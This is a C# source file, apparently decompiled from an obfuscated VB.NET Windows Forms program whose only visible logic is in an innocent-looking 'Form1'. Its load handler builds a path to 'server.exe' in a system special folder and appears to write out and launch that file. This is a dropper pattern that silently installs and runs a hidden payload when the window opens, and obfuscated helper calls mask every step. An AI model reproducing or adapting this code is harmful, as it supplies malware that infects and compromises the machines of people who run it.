using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization;
using System.Security;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using clen.My;
using ns0;

namespace clen;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> list_0;

	private Class10.Class13.Class14 class14_0 = new Class10.Class13.Class14();

	internal int int_0;

	[SecuritySafeCritical]
	static Form1()
	{
		Class6.smethod_1();
		list_0 = new List<WeakReference>();
	}

	public Form1()
	{
		Class3.Class5.smethod_6<Form, EventHandler>((Form)(object)this, (EventHandler)method_1, 'ă', 'Ċ');
		smethod_0(this);
		method_0();
	}

	private static void smethod_0(object object_0)
	{
		List<WeakReference> gparam_ = list_0;
		bool bool_ = false;
		checked
		{
			try
			{
				Class3.Class5.smethod_0((object)gparam_, ref bool_, (short)526, 543);
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference gparam_2 = (WeakReference)(ISerializable)list_0[num3];
						if (Class3.Class5.smethod_2(gparam_2, 'Ì', 130))
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(Class6.smethod_2(object_0, 'Ñ', 240)));
			}
			finally
			{
				if (bool_)
				{
					Class10.Class13.smethod_5((object)gparam_, 'c', ' ');
				}
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && class14_0.icontainer_0 != null) ? true : false)
			{
				class14_0.icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void method_0()
	{
		Class3.Class5.smethod_10<Control>((Control)(object)this, '\u0369', (short)821);
		SizeF sizeF_ = new SizeF(6f, 13f);
		Class3.Class5.smethod_11<ContainerControl>((ContainerControl)(object)this, sizeF_, 986, 940);
		Class6.smethod_7<ContainerControl>((ContainerControl)(object)this, (AutoScaleMode)1, '\u02de', 729);
		Size size_ = new Size(284, 262);
		Class3.Class5.smethod_13<Form>((Form)(object)this, size_, 173, 173);
		Class3.smethod_16<Control, string>((Control)(object)this, "Form1", '=', '\u001e');
		Class10.Class13.smethod_7<string, Form>((Form)(object)this, "Form1", (short)743, '\u02c4');
		Class10.smethod_9<Control>((Control)(object)this, bool_0: false, 'ı', (short)272);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void method_1(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string gparam_ = default(string);
		string gparam_2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					Class6.smethod_8(621, 622);
					num3 = -2;
					goto IL_0013;
				case 166:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							default:
								goto end_IL_0001;
							case 0:
								goto end_IL_0001;
							case 1:
								break;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0013;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_004f;
						case 5:
							goto IL_006c;
						case 6:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 7:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_006c:
					num = 5;
					Class3.smethod_19(gparam_, Class6.smethod_0(), 'Ď', 'č');
					break;
					IL_004f:
					num = 4;
					gparam_ = (string)(IEnumerable)Class3.smethod_15(gparam_2, "server.exe", 'Ǧ', 'Ɣ');
					goto IL_006c;
					IL_0013:
					num = 2;
					int_0 = 1000;
					goto IL_0020;
					IL_0020:
					num = 3;
					gparam_2 = Class6.Class8.smethod_7<SpecialDirectoriesProxy>(Class6.smethod_10<FileSystemProxy>(Class3.smethod_18<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, '\u0017', (short)19), '\u034a', '\u031d'), 'ĵ', (short)313);
					goto IL_004f;
					end_IL_0001_2:
					break;
				}
				num = 6;
				Class3.smethod_20(gparam_, 39, 9);
				Class6.smethod_8(306, 310);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				Class10.smethod_3((Exception)obj, 1011, 991);
				try0001_dispatch = 166;
				continue;
			}
			throw Class10.Class11.smethod_8(-2146828237, 511, 'Ʋ');
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
